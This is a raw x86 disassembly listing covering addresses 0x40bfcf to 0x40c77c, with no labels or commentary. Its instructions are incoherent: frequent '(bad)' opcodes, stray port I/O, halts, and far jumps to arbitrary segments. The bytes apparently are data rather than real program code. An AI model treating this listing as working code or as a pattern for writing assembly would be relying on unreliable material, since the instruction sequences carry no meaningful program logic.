  40bfcf:	or     BYTE PTR [eax],al
  40bfd1:	pop    ss
  40bfd2:	mov    al,ds:0xdcae0304
  40bfd7:	push   ebp
  40bfd8:	or     eax,0xfc895b50
  40bfdd:	and    dh,BYTE PTR [ecx]
  40bfdf:	jae    0x40bf9b
  40bfe1:	xor    eax,0x2ee185d7
  40bfe6:	js     0x40c062
  40bfe8:	aas    
  40bfe9:	xchg   ecx,eax
  40bfea:	retf   
  40bfeb:	jno    0x40bf8b
  40bfed:	repz jge 0x40bfb8
  40bff0:	cmp    al,0xe7
  40bff2:	loopne 0x40bffe
  40bff4:	aaa    
  40bff5:	mov    BYTE PTR [esi+eax*2],bl
  40bff8:	adc    eax,0x7d01b2ba
  40bffd:	das    
  40bffe:	push   eax
  40bfff:	bound  edi,QWORD PTR [edi+0x3ea00bc6]
  40c005:	out    0x50,al
  40c007:	inc    ecx
  40c008:	add    dh,BYTE PTR [ecx+ebp*1-0x2420af24]
  40c00f:	or     eax,0x2c513cab
  40c014:	retf   0x54e6
  40c017:	sahf   
  40c018:	cmp    al,0xae
  40c01a:	push   ds
  40c01b:	mov    ecx,0x527b613e
  40c020:	and    dh,BYTE PTR [ebx-0x44]
  40c023:	sbb    ebp,DWORD PTR [esi+eiz*8+0x5a]
  40c027:	test   eax,0x134369f9
  40c02c:	sahf   
  40c02d:	clc    
  40c02e:	cmp    edx,DWORD PTR [edi-0x20700cc2]
  40c034:	jmp    0x60e8:0x642e1b31
  40c03b:	iret   
  40c03c:	sbb    eax,0xcae9d001
  40c041:	dec    esp
  40c042:	adc    DWORD PTR ds:0xdb65af3e,eax
  40c048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c049:	(bad)  
  40c04a:	sbb    BYTE PTR [edi-0x74a9199c],cl
  40c050:	scas   al,BYTE PTR es:[edi]
  40c051:	push   edi
  40c052:	inc    esp
  40c053:	in     al,0x63
  40c055:	mov    ds:0xd5bd04e9,eax
  40c05a:	jbe    0x40c038
  40c05c:	sbb    esi,esp
  40c05e:	pop    edx
  40c05f:	aam    0x8b
  40c061:	sti    
  40c062:	sbb    BYTE PTR [ecx],dh
  40c064:	and    eax,0x9939c803
  40c069:	mov    ds,WORD PTR [edx-0x5b]
  40c06c:	cmp    edi,DWORD PTR ds:[ebp+0x30d6dda]
  40c073:	clc    
  40c074:	sub    eax,0x245d74e7
  40c079:	or     DWORD PTR [edx+0x37],0x53
  40c07d:	cmp    cl,BYTE PTR [edx]
  40c07f:	gs dec edi
  40c081:	mov    ?,WORD PTR [edi-0x50]
  40c084:	test   eax,0x269c5520
  40c089:	cld    
  40c08a:	mov    edx,0x94c2ea52
  40c08f:	test   BYTE PTR [ebp+0x4e],ch
  40c092:	dec    ecx
  40c093:	cmp    al,0x3f
  40c095:	pop    ss
  40c096:	mov    edi,0xfe68c5ee
  40c09b:	rcl    esp,0xe7
  40c09e:	cs add dh,0x53
  40c0a2:	fdiv   st,st(4)
  40c0a4:	add    esi,DWORD PTR [edx-0x47]
  40c0a7:	push   cs
  40c0a8:	adc    eax,0xad445b3a
  40c0ad:	mul    bl
  40c0af:	ins    BYTE PTR es:[edi],dx
  40c0b0:	sub    BYTE PTR ds:0xa6e857f,ch
  40c0b6:	jmp    0x99df:0xe4953ec3
  40c0bd:	hlt    
  40c0be:	addr16 cmp cl,al
  40c0c1:	leave  
  40c0c2:	or     al,0xca
  40c0c4:	sbb    eax,0x468102ec
  40c0c9:	loopne 0x40c0b0
  40c0cb:	lock pop ds
  40c0cd:	call   0x5d7f7eff
  40c0d2:	push   ss
  40c0d3:	and    edi,DWORD PTR [esi+0x7f]
  40c0d6:	rol    BYTE PTR [esi-0x49],0xe7
  40c0da:	es retf 0x3695
  40c0de:	(bad)  
  40c0e0:	mov    ebp,0x90accc13
  40c0e5:	jne    0x40c139
  40c0e7:	mov    esp,0x6a7e6abe
  40c0ec:	addr16 out 0x34,eax
  40c0ef:	fisttp QWORD PTR [ecx-0x3d89e157]
  40c0f5:	sbb    edx,DWORD PTR [ecx+0x629f1b35]
  40c0fb:	pushf  
  40c0fc:	jl     0x40c123
  40c0fe:	pop    edx
  40c0ff:	jge    0x40c0c7
  40c101:	xchg   esi,eax
  40c102:	(bad)  
  40c103:	lock dec ecx
  40c105:	and    BYTE PTR [edx+0x50],dh
  40c108:	xchg   DWORD PTR [eax],eax
  40c10a:	pop    ebx
  40c10b:	retf   
  40c10c:	add    ebx,DWORD PTR [ebx+esi*1-0x2d]
  40c110:	lds    edi,FWORD PTR [ebx+0x30a2485b]
  40c116:	push   0x35ef0c99
  40c11b:	call   0xc9db:0x4343283f
  40c122:	mov    ds:0x5a39bb52,al
  40c127:	imul   edi,DWORD PTR ds:[ebx-0x37912040],0x2705857d
  40c132:	xor    eax,0x1d693e75
  40c137:	test   DWORD PTR [edi+0x3f1dee9b],0xf8ae52e6
  40c141:	push   es
  40c142:	jmp    0x4eda:0x6b9fa34f
  40c149:	inc    esi
  40c14a:	pop    edx
  40c14b:	jmp    0x9da:0x61252e75
  40c152:	aad    0x85
  40c154:	nop
  40c155:	jbe    0x40c12f
  40c157:	mov    al,ds:0x92b31f3f
  40c15c:	mov    DWORD PTR [ebx-0x1c4a213e],0x662080b6
  40c166:	popa   
  40c167:	pop    esi
  40c168:	mov    ecx,0x80ec3cc8
  40c16d:	sub    DWORD PTR [ebx+0x28cb2665],ebx
  40c173:	in     al,0x20
  40c175:	ja     0x40c119
  40c177:	into   
  40c178:	mov    ch,0x74
  40c17a:	inc    ebp
  40c17b:	(bad)  
  40c17c:	loopne 0x40c164
  40c17e:	fs aam 0xe9
  40c181:	and    eax,0x686689be
  40c186:	mov    eax,0x5b68ec4f
  40c18b:	push   ds
  40c18c:	fiadd  WORD PTR [ebx+0x3dbe2cd0]
  40c192:	cmc    
  40c193:	test   DWORD PTR [ecx-0x65],edx
  40c196:	imul   ecx,edx,0xffffffce
  40c199:	pop    edi
  40c19a:	mov    eax,ds:0x875b3e4d
  40c19f:	lods   eax,DWORD PTR ds:[esi]
  40c1a0:	xchg   esi,eax
  40c1a1:	push   cs
  40c1a2:	out    dx,eax
  40c1a3:	call   0x663fa8a6
  40c1a8:	sbb    al,0xb8
  40c1aa:	jge    0x40c1d1
  40c1ac:	rcl    DWORD PTR [ebp+ebp*8+0x59],0xf3
  40c1b1:	and    DWORD PTR [edx-0x22],esp
  40c1b4:	lock rcr edx,0xe1
  40c1b8:	pop    esp
  40c1b9:	in     eax,0x4c
  40c1bb:	fnsetpm(287 only) 
  40c1bd:	xchg   esp,eax
  40c1be:	arpl   WORD PTR [edi-0x7af59d4],bx
  40c1c4:	ds mov cl,0xed
  40c1c7:	es xchg ebx,eax
  40c1c9:	mov    bh,0x47
  40c1cb:	push   es
  40c1cc:	shl    edi,cl
  40c1ce:	push   edx
  40c1cf:	sub    BYTE PTR [ebx-0x27],cl
  40c1d2:	cld    
  40c1d3:	fs push ebx
  40c1d5:	sbb    BYTE PTR [ecx+0x5bc4af7d],0xdc
  40c1dc:	(bad)  
  40c1de:	sbb    esi,DWORD PTR [eax-0x7aea5906]
  40c1e4:	neg    BYTE PTR [esi-0x2ac17d56]
  40c1ea:	mov    edi,0x4be0a7ab
  40c1ef:	ja     0x40c185
  40c1f1:	out    0x94,al
  40c1f3:	int3   
  40c1f4:	fcmovnbe st,st(7)
  40c1f6:	repnz mov ?,esi
  40c1f9:	mov    ebp,0xbb3e67f8
  40c1fe:	mov    dl,0x34
  40c200:	and    ch,bh
  40c202:	mov    ecx,0x54e65225
  40c207:	outs   dx,BYTE PTR ds:[esi]
  40c208:	or     eax,0x75b52bdb
  40c20d:	push   0x2b3ead8c
  40c212:	mov    dl,0x11
  40c214:	mul    BYTE PTR [ebx+ebp*8-0x6d]
  40c218:	(bad)  
  40c219:	out    0x7e,eax
  40c21b:	in     eax,dx
  40c21c:	sub    edx,edx
  40c21e:	jne    0x40c22a
  40c220:	sbb    BYTE PTR [ebp-0x1258fa34],bh
  40c226:	pop    ebx
  40c227:	mov    esi,0xc121e366
  40c22c:	mov    dh,0x81
  40c22e:	cmp    al,BYTE PTR [ecx+eax*4+0x3f09e189]
  40c235:	in     eax,dx
  40c236:	hlt    
  40c237:	jmp    0x54a6239e
  40c23c:	mov    ch,0xe9
  40c23e:	enter  0x7690,0xef
  40c242:	cs jl  0x40c25d
  40c245:	retf   0xa4b8
  40c248:	aas    
  40c249:	cdq    
  40c24a:	xchg   esi,eax
  40c24b:	lds    ecx,FWORD PTR [edx+esi*1]
  40c24e:	imul   ecx,edi,0xffffffc3
  40c251:	out    0x9c,al
  40c253:	pop    ecx
  40c254:	test   eax,0xc934883f
  40c259:	xor    al,0xc7
  40c25b:	cmovl  esi,DWORD PTR [ebp-0x63a2df5b]
  40c262:	fadd   DWORD PTR [ebp-0x11ede82b]
  40c268:	nop
  40c269:	cld    
  40c26a:	jmp    0x3ec0:0x86cd8284
  40c271:	push   DWORD PTR [ebp-0x41]
  40c274:	push   ebp
  40c275:	add    DWORD PTR [ebx+0x1a],0x8bb8e7f9
  40c27c:	and    DWORD PTR [ecx-0x67b8d361],edi
  40c282:	int    0xf3
  40c284:	mov    al,0xa1
  40c286:	push   ebp
  40c287:	push   ds
  40c288:	jg     0x40c2c3
  40c28a:	in     eax,dx
  40c28b:	bound  ebp,QWORD PTR [eax]
  40c28d:	xlat   BYTE PTR ds:[ebx]
  40c28e:	xchg   edi,eax
  40c28f:	jno    0x40c257
  40c291:	fdivr  st(4),st
  40c293:	adc    DWORD PTR ds:0xe5e2f2f7,0x3ec19bb1
  40c29d:	add    DWORD PTR [edx+0x7f38524b],ebx
  40c2a3:	adc    dh,BYTE PTR [edi]
  40c2a5:	out    0xda,al
  40c2a7:	jnp    0x40c299
  40c2a9:	dec    esp
  40c2aa:	xchg   DWORD PTR [esi],ebp
  40c2ac:	mov    edi,0x3eebbee9
  40c2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2b2:	stos   DWORD PTR es:[edi],eax
  40c2b3:	and    eax,0xb71e07b9
  40c2b8:	add    eax,0xf75d3ebb
  40c2bd:	out    0x54,eax
  40c2bf:	cmp    edi,esp
  40c2c1:	iret   
  40c2c2:	scas   eax,DWORD PTR es:[edi]
  40c2c3:	mov    al,0x3e
  40c2c5:	sub    ecx,DWORD PTR [ebx+edi*1-0xd30ef75]
  40c2cc:	mov    fs,esi
  40c2ce:	push   eax
  40c2cf:	push   edx
  40c2d0:	mov    eax,0x20f418c2
  40c2d5:	test   eax,0xc73f653f
  40c2da:	mov    al,ds:0x674f6852
  40c2df:	icebp  
  40c2e0:	add    al,0xe8
  40c2e2:	add    DWORD PTR cs:[ecx+0x7316e2ac],edi
  40c2e9:	gs dec ecx
  40c2eb:	inc    esp
  40c2ec:	mov    BYTE PTR [eax+0x51f8d96f],0x5b
  40c2f3:	sbb    al,0xe3
  40c2f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f6:	in     al,0x69
  40c2f8:	(bad)  
  40c2f9:	out    0xa8,al
  40c2fb:	push   0x200cff19
  40c300:	jbe    0x40c353
  40c302:	inc    eax
  40c303:	(bad)  
  40c304:	fnstenv [ebx-0x54]
  40c307:	push   es
  40c308:	iret   
  40c309:	and    ebx,DWORD PTR [edx+0x76]
  40c30c:	scas   al,BYTE PTR es:[edi]
  40c30d:	mov    bl,0xf8
  40c30f:	jns    0x40c30f
  40c311:	in     eax,dx
  40c312:	xor    BYTE PTR [edx+0x31],bh
  40c315:	dec    ecx
  40c316:	sub    DWORD PTR [ebp+0x3b],esi
  40c319:	mov    esp,0x813f04ad
  40c31e:	jno    0x40c359
  40c320:	jmp    0x40c323
  40c322:	xchg   ecx,eax
  40c323:	inc    esi
  40c324:	push   0xffffffe1
  40c326:	and    ch,BYTE PTR [ecx+0x7d84780f]
  40c32c:	pop    esi
  40c32d:	pop    esi
  40c32e:	jno    0x40c36a
  40c330:	aas    
  40c331:	pop    ebx
  40c332:	loopne 0x40c30a
  40c334:	fild   DWORD PTR [edx]
  40c336:	test   BYTE PTR [edx-0x75df1cc0],dl
  40c33c:	sbb    al,0xe4
  40c33e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c33f:	and    DWORD PTR [eax+0xe80fc3d],edi
  40c345:	or     BYTE PTR [ebx+0x5bf7fb6d],ch
  40c34b:	pusha  
  40c34c:	in     eax,0xee
  40c34e:	pusha  
  40c34f:	dec    edx
  40c350:	cmc    
  40c351:	out    0x56,al
  40c353:	ins    DWORD PTR es:[edi],dx
  40c354:	lea    edx,[esi]
  40c356:	(bad)  [ebx-0x4f]
  40c359:	cmp    ecx,DWORD PTR [eax+0x47]
  40c35c:	push   edi
  40c35d:	out    0x28,eax
  40c35f:	mov    ss,WORD PTR [ecx]
  40c361:	nop
  40c362:	in     eax,dx
  40c363:	dec    edx
  40c364:	adc    ebx,esp
  40c366:	inc    edx
  40c367:	xchg   esp,eax
  40c368:	push   es
  40c369:	pop    edx
  40c36a:	xchg   esi,eax
  40c36b:	(bad)  
  40c36d:	loope  0x40c332
  40c36f:	add    al,0x5b
  40c371:	and    eax,0xce7ee19
  40c376:	and    al,0xa4
  40c378:	add    ecx,DWORD PTR [edi]
  40c37a:	pop    ebx
  40c37b:	or     al,0x19
  40c37d:	outs   dx,BYTE PTR ds:[esi]
  40c37e:	dec    edx
  40c37f:	clc    
  40c380:	ss jno 0x40c349
  40c383:	test   dl,bh
  40c385:	jecxz  0x40c3ff
  40c387:	scas   al,BYTE PTR es:[edi]
  40c388:	dec    ecx
  40c389:	mov    ch,0xd9
  40c38b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c38c:	icebp  
  40c38d:	iret   
  40c38e:	add    eax,DWORD PTR [ebp-0x5b536624]
  40c394:	rol    DWORD PTR [esi],cl
  40c396:	stos   BYTE PTR es:[edi],al
  40c397:	jno    0x40c353
  40c399:	xlat   BYTE PTR ds:[ebx]
  40c39a:	xlat   BYTE PTR ds:[ebx]
  40c39b:	test   bh,ah
  40c39d:	fcom   st(6)
  40c39f:	and    DWORD PTR [esi],edi
  40c3a1:	adc    esp,ecx
  40c3a3:	inc    esi
  40c3a4:	clc    
  40c3a5:	mov    ebx,0xe6a2b2f1
  40c3aa:	int3   
  40c3ab:	xlat   BYTE PTR ds:[ebx]
  40c3ac:	or     al,0x6a
  40c3ae:	pop    ds
  40c3af:	xchg   edi,eax
  40c3b0:	mov    ecx,DWORD PTR [edx-0x43d02e5]
  40c3b6:	pop    ebx
  40c3b7:	mov    al,0x25
  40c3b9:	jo     0x40c411
  40c3bb:	add    DWORD PTR [esi+0x21],0x2d
  40c3bf:	test   BYTE PTR [eax+0x3e37787e],bl
  40c3c5:	addr16 ja 0x40c3d8
  40c3c8:	xchg   edx,eax
  40c3c9:	inc    ebp
  40c3ca:	and    eax,0xb4e61017
  40c3cf:	(bad)  
  40c3d0:	cmp    DWORD PTR [ebx+0x73],ebp
  40c3d3:	shl    ebx,1
  40c3d5:	mov    al,0xd9
  40c3d7:	(bad)  
  40c3d8:	rol    BYTE PTR [eax+0x5a],0xde
  40c3dc:	push   esi
  40c3dd:	mov    ebx,0x61af416
  40c3e2:	add    BYTE PTR [ebp+0x2d3947d3],al
  40c3e8:	aas    
  40c3e9:	xchg   ecx,eax
  40c3ea:	outs   dx,DWORD PTR ds:[esi]
  40c3eb:	add    DWORD PTR [edx+0x5ef69a33],edx
  40c3f1:	out    0x86,eax
  40c3f3:	inc    edi
  40c3f4:	add    bl,BYTE PTR [edx+0x22]
  40c3f7:	ins    BYTE PTR es:[edi],dx
  40c3f8:	(bad)  
  40c3f9:	jmp    0xee5b:0xbcbf947f
  40c400:	mov    ebp,0x4cb038bf
  40c405:	stos   BYTE PTR es:[edi],al
  40c406:	adc    eax,0xb87dce84
  40c40b:	mov    esi,0x980dbeda
  40c410:	mov    al,ds:0x8a025bd8
  40c415:	and    eax,0xbc7ad104
  40c41a:	jle    0x40c3a1
  40c41c:	ins    BYTE PTR es:[edi],dx
  40c41d:	add    al,0x9e
  40c41f:	push   esp
  40c420:	aas    
  40c421:	dec    edi
  40c422:	shl    DWORD PTR [ebp+edi*2+0x3d8f1356],cl
  40c429:	out    0xe,eax
  40c42b:	and    eax,0x6724d617
  40c430:	outs   dx,BYTE PTR ds:[esi]
  40c431:	cmp    al,0xe0
  40c433:	add    eax,eax
  40c435:	out    0x5b,al
  40c437:	push   edx
  40c438:	iret   
  40c439:	imul   eax,DWORD PTR [ebp+0x4a809460],0xcc78ef84
  40c443:	inc    esi
  40c444:	xor    DWORD PTR [edi+0x17],edx
  40c447:	shl    BYTE PTR [edx],cl
  40c449:	fmul   st(2),st
  40c44b:	xchg   edx,eax
  40c44c:	outs   dx,DWORD PTR ds:[esi]
  40c44d:	mov    ecx,0x825c8b1a
  40c452:	xchg   DWORD PTR [edx+ecx*4-0x9be6c78],eax
  40c459:	fs xchg esp,eax
  40c45b:	leave  
  40c45c:	jae    0x40c3e0
  40c45e:	pop    edx
  40c45f:	add    dh,dh
  40c461:	test   edi,edi
  40c463:	pushf  
  40c464:	stos   BYTE PTR es:[edi],al
  40c465:	(bad)  
  40c466:	arpl   di,di
  40c468:	jnp    0x40c3ea
  40c46a:	pop    edx
  40c46b:	fadd   DWORD PTR [eax-0x2104b36c]
  40c471:	ins    BYTE PTR es:[edi],dx
  40c472:	pop    edx
  40c473:	sub    al,0x48
  40c475:	in     al,dx
  40c476:	lahf   
  40c477:	jbe    0x40c4e0
  40c479:	out    0x70,eax
  40c47b:	inc    ecx
  40c47c:	enter  0x88c1,0x4f
  40c480:	je     0x40c4f5
  40c482:	sub    eax,DWORD PTR [eax+0x7e5a78f9]
  40c488:	fisub  WORD PTR ds:0xb28491e7
  40c48e:	(bad)  
  40c48f:	test   BYTE PTR [ebp-0x21],ah
  40c492:	ret    0x38a4
  40c495:	leave  
  40c496:	aaa    
  40c497:	pop    ebp
  40c498:	hlt    
  40c499:	or     BYTE PTR ds:0xbd9e3f1a,bl
  40c49f:	stos   BYTE PTR es:[edi],al
  40c4a0:	adc    eax,0xdc975ae8
  40c4a5:	addr16 out dx,eax
  40c4a7:	lahf   
  40c4a8:	stc    
  40c4a9:	sti    
  40c4aa:	push   ecx
  40c4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ac:	aas    
  40c4ad:	xor    ebp,DWORD PTR [esi+0x547eb25a]
  40c4b3:	add    DWORD PTR [eax-0x21108f1f],edi
  40c4b9:	lock jns 0x40c445
  40c4bc:	fild   QWORD PTR [edx]
  40c4be:	dec    BYTE PTR [eax+esi*1+0x29]
  40c4c2:	call   0x5e08:0xff525db
  40c4c9:	in     al,0x14
  40c4cb:	sbb    DWORD PTR [ebp-0x113aa91a],esi
  40c4d1:	rcl    dh,cl
  40c4d3:	out    0x5f,al
  40c4d5:	call   0xf25a:0xb708b016
  40c4dc:	xor    esp,ebx
  40c4de:	pop    ebp
  40c4df:	nop
  40c4e0:	inc    eax
  40c4e1:	dec    edi
  40c4e2:	jp     0x40c49d
  40c4e4:	mov    eax,cs
  40c4e6:	cmp    al,BYTE PTR [edi+ebx*8]
  40c4e9:	test   eax,0x500c07ee
  40c4ee:	pop    edx
  40c4ef:	jp     0x40c4f7
  40c4f1:	sti    
  40c4f2:	fadd   st(4),st
  40c4f4:	adc    al,BYTE PTR [ebp-0x5e]
  40c4f7:	test   BYTE PTR ds:0x3088aeae,dh
  40c4fd:	in     eax,dx
  40c4fe:	xchg   edx,eax
  40c4ff:	ret    0x9b
  40c502:	inc    ebp
  40c503:	add    ah,BYTE PTR [edi-0x4bbdc520]
  40c509:	pop    esi
  40c50a:	scas   eax,DWORD PTR es:[edi]
  40c50b:	test   DWORD PTR [eax+0x1a49128f],edi
  40c511:	xor    ebx,ebx
  40c513:	inc    ecx
  40c514:	mov    esp,0x979ce282
  40c519:	or     dh,BYTE PTR [edi-0x5b]
  40c51c:	cli    
  40c51d:	cmp    ah,ah
  40c51f:	test   BYTE PTR [eax-0x5f],cl
  40c522:	inc    edi
  40c523:	cmc    
  40c524:	aas    
  40c525:	das    
  40c526:	jns    0x40c578
  40c528:	scas   eax,DWORD PTR es:[edi]
  40c529:	dec    eax
  40c52a:	fwait
  40c52b:	mov    edi,0xea4ee61b
  40c530:	push   ds
  40c531:	ds clc 
  40c533:	mov    es,ecx
  40c535:	std    
  40c536:	push   0xffffff89
  40c538:	sub    DWORD PTR [esi+0x1b9f745b],0x7529768
  40c542:	add    al,BYTE PTR [edx+eax*2-0x20883877]
  40c549:	add    ebp,DWORD PTR [esi-0xa]
  40c54c:	inc    ebx
  40c54d:	mov    eax,0x8e599e5a
  40c552:	int3   
  40c553:	sbb    al,0x2c
  40c555:	add    al,0x20
  40c557:	test   DWORD PTR [esi],edx
  40c559:	xor    BYTE PTR [esi],0x20
  40c55c:	aas    
  40c55d:	mov    cl,0x8e
  40c55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c560:	xor    ebp,DWORD PTR [ebx]
  40c562:	(bad)  
  40c563:	rol    BYTE PTR [ebx-0x11],0x98
  40c567:	mov    ds:0x372d660c,eax
  40c56c:	add    esi,DWORD PTR [edi+0x757803b4]
  40c572:	fwait
  40c573:	mov    bh,0x58
  40c575:	in     al,0xea
  40c577:	int3   
  40c578:	ror    DWORD PTR [edi],1
  40c57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c57b:	xlat   BYTE PTR ds:[ebx]
  40c57c:	pop    DWORD PTR [eax]
  40c57e:	mov    bl,0x7c
  40c580:	and    al,0x2b
  40c582:	jg     0x40c509
  40c584:	xchg   DWORD PTR [eax-0x8f89b50],ebx
  40c58a:	ins    BYTE PTR es:[edi],dx
  40c58b:	ret    
  40c58c:	xchg   ecx,eax
  40c58d:	sbb    eax,0xe7f9df5f
  40c592:	cmp    bl,BYTE PTR [ecx+0x3c]
  40c595:	call   0x3e0f:0x938e6cb8
  40c59c:	add    DWORD PTR [ebp+0x7a],esi
  40c59f:	popa   
  40c5a0:	aas    
  40c5a1:	loope  0x40c580
  40c5a3:	dec    esi
  40c5a4:	mov    edi,0xe470c138
  40c5a9:	xchg   DWORD PTR [ebp-0xf],esi
  40c5ac:	fild   WORD PTR [esi-0xc113ba6]
  40c5b2:	loope  0x40c5cb
  40c5b4:	sbb    DWORD PTR [edx+ebx*2+0x60],0xffd5bd89
  40c5bc:	or     BYTE PTR [ebx+0xb],ch
  40c5bf:	test   ebp,eax
  40c5c1:	xchg   ecx,eax
  40c5c2:	sbb    esi,DWORD PTR [esi+0x24d6b53e]
  40c5c8:	call   FWORD PTR [edi-0x19166dc7]
  40c5ce:	inc    eax
  40c5cf:	aaa    
  40c5d0:	pop    ebx
  40c5d1:	sti    
  40c5d2:	xor    ebp,DWORD PTR [ebx]
  40c5d4:	jbe    0x40c566
  40c5d6:	stos   BYTE PTR es:[edi],al
  40c5d7:	mov    ch,0xb4
  40c5d9:	xchg   ebp,eax
  40c5da:	inc    edi
  40c5db:	enter  0x3d98,0xfc
  40c5df:	add    eax,0x8368e77e
  40c5e4:	pop    eax
  40c5e5:	mov    ebx,0xc97b8a2a
  40c5ea:	hlt    
  40c5eb:	or     BYTE PTR [edx],cl
  40c5ed:	icebp  
  40c5ee:	pop    ebx
  40c5ef:	(bad)  
  40c5f1:	mov    bh,0xbd
  40c5f3:	lods   al,BYTE PTR ds:[esi]
  40c5f4:	call   0xdba45cdf
  40c5f9:	xchg   esp,eax
  40c5fa:	jns    0x40c5f9
  40c5fc:	cmp    bl,BYTE PTR [ebp+0x6d5efda7]
  40c602:	pop    edx
  40c603:	int3   
  40c604:	iret   
  40c605:	das    
  40c606:	or     eax,0x3935383c
  40c60b:	mov    al,BYTE PTR [ecx]
  40c60d:	xchg   dl,dl
  40c60f:	add    ah,BYTE PTR [ebp+ecx*8-0x28]
  40c613:	retf   0x459f
  40c616:	pop    ebx
  40c617:	jmp    0x7544:0x784e1524
  40c61e:	mov    ebx,0x40eb4382
  40c623:	aas    
  40c624:	sbb    edi,DWORD PTR [edi]
  40c626:	pop    ecx
  40c627:	aad    0x3f
  40c629:	pop    edi
  40c62a:	aad    0x39
  40c62c:	dec    ebx
  40c62d:	sub    bh,BYTE PTR [eax]
  40c62f:	mov    bh,0xf9
  40c631:	fadd   st(2),st
  40c633:	dec    ecx
  40c634:	and    DWORD PTR [edi+0x41],esp
  40c637:	sar    eax,cl
  40c639:	dec    ecx
  40c63a:	rol    DWORD PTR [ecx+0x3a],0x8f
  40c63e:	setl   cl
  40c641:	xchg   ecx,eax
  40c642:	cmp    DWORD PTR [ecx+0x4476822],0x1e
  40c649:	dec    esi
  40c64a:	push   esi
  40c64b:	test   DWORD PTR [eax+0x3f362be5],ebp
  40c651:	lahf   
  40c652:	out    0x40,eax
  40c654:	pop    ds
  40c655:	loope  0x40c696
  40c657:	push   ss
  40c658:	pop    eax
  40c659:	xchg   esi,eax
  40c65a:	jb     0x40c5f9
  40c65c:	test   BYTE PTR ds:[ecx-0x17],bh
  40c660:	dec    ebp
  40c661:	push   ds
  40c662:	ret    0x3e48
  40c665:	push   ebp
  40c666:	inc    ebx
  40c667:	retf   
  40c668:	mov    bh,0x3c
  40c66a:	ds push edi
  40c66c:	push   ds
  40c66d:	out    0x86,eax
  40c66f:	push   edi
  40c670:	(bad)
  40c673:	iret   
  40c674:	inc    ecx
  40c675:	mov    BYTE PTR [eax+0x5b1a2762],ch
  40c67b:	scas   al,BYTE PTR es:[edi]
  40c67c:	nop
  40c67d:	push   ebx
  40c67e:	in     eax,0x5f
  40c680:	into   
  40c681:	out    0xe7,al
  40c683:	test   DWORD PTR [eax-0x2d],esi
  40c686:	pop    ecx
  40c687:	sahf   
  40c688:	aas    
  40c689:	(bad)  
  40c68a:	call   0x2512:0x5f9a347c
  40c691:	out    0xd8,al
  40c693:	sub    BYTE PTR ds:0x2ec0ddea,0x3a
  40c69a:	dec    edi
  40c69b:	push   esi
  40c69c:	sahf   
  40c69d:	scas   eax,DWORD PTR es:[edi]
  40c69e:	pop    edx
  40c69f:	ror    BYTE PTR [ecx+edi*8],0xb1
  40c6a3:	call   0xf3fcba68
  40c6a8:	test   edi,esp
  40c6aa:	test   al,0x71
  40c6ac:	pop    esp
  40c6ad:	retf   0xf993
  40c6b0:	ret    
  40c6b1:	jmp    0x685055dc
  40c6b6:	pop    ebx
  40c6b7:	pop    esi
  40c6b8:	jp     0x40c720
  40c6ba:	mov    ebx,0x609cb2fb
  40c6bf:	test   dl,bh
  40c6c1:	dec    ebx
  40c6c2:	ret    0x3ebb
  40c6c5:	lds    ebp,FWORD PTR [eax+0x6f]
  40c6c8:	repz cdq 
  40c6ca:	and    bl,bl
  40c6cc:	push   ebp
  40c6cd:	pop    es
  40c6ce:	xor    al,0x62
  40c6d0:	out    dx,eax
  40c6d1:	into   
  40c6d2:	clc    
  40c6d3:	inc    esp
  40c6d4:	jecxz  0x40c719
  40c6d6:	adc    ecx,DWORD PTR [edi]
  40c6d8:	or     DWORD PTR [ebx+0x5a],0x3cb0c81e
  40c6df:	aam    0xcd
  40c6e1:	gs pop ecx
  40c6e3:	cwde   
  40c6e4:	stos   DWORD PTR es:[edi],eax
  40c6e5:	lods   eax,DWORD PTR ds:[esi]
  40c6e6:	cmc    
  40c6e7:	out    dx,al
  40c6e8:	lahf   
  40c6e9:	out    0xf2,eax
  40c6eb:	push   ebp
  40c6ec:	test   esp,ecx
  40c6ee:	enter  0x33f5,0xf5
  40c6f2:	loopne 0x40c6de
  40c6f4:	xor    esp,DWORD PTR [edx-0x350b0da6]
  40c6fa:	xlat   BYTE PTR ds:[ebx]
  40c6fb:	or     ah,0x73
  40c6fe:	push   0xffffff85
  40c700:	jmp    0x40c6ca
  40c702:	pop    ecx
  40c703:	xchg   esi,eax
  40c704:	aas    
  40c705:	mov    edi,0x7aa03324
  40c70a:	out    dx,eax
  40c70b:	test   al,0xf8
  40c70e:	sub    dl,BYTE PTR [esi-0x59147a54]
  40c714:	imul   esp,DWORD PTR [ecx],0x1a
  40c717:	dec    ebx
  40c718:	aas    
  40c719:	xchg   edi,edi
  40c71b:	mov    bh,BYTE PTR [esi-0x47]
  40c71e:	or     BYTE PTR [ebp+0xa],dl
  40c721:	out    0x26,al
  40c723:	sbb    al,0x27
  40c725:	test   DWORD PTR [edi+edx*4+0x45da0149],ecx
  40c72c:	jno    0x40c710
  40c72e:	je     0x40c6de
  40c730:	out    dx,eax
  40c731:	mov    ecx,0x7604b85b
  40c736:	cld    
  40c737:	jnp    0x40c777
  40c739:	or     esi,esi
  40c73b:	pop    ebx
  40c73c:	(bad)  
  40c73d:	jp     0x40c6c4
  40c73f:	mov    ds:0xc98e1f3f,al
  40c744:	jg     0x40c6ff
  40c746:	popa   
  40c747:	bound  edx,QWORD PTR [esi-0x1a]
  40c74a:	data16 xchg BYTE PTR [esi],ch
  40c74d:	imul   ecx,DWORD PTR [ebx],0x281a5463
  40c753:	add    ch,bh
  40c755:	fadd   DWORD PTR [esi+0x6c]
  40c758:	cmp    ebx,DWORD PTR [edi-0x29]
  40c75b:	and    BYTE PTR [edi],bl
  40c75d:	xchg   sp,ax
  40c75f:	jmp    0x101c:0x3a8cf188
  40c766:	jne    0x40c795
  40c768:	push   edi
  40c769:	xor    ebx,ebx
  40c76b:	xchg   esi,eax
  40c76c:	ds pop ds
  40c76e:	sub    esp,ebx
  40c770:	mov    bh,BYTE PTR ds:0xe67c61ec
  40c776:	(bad)  
  40c778:	mov    dl,0x5b
  40c77a:	inc    esp
  40c77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c77c:	fcom   DWORD PTR [eax]
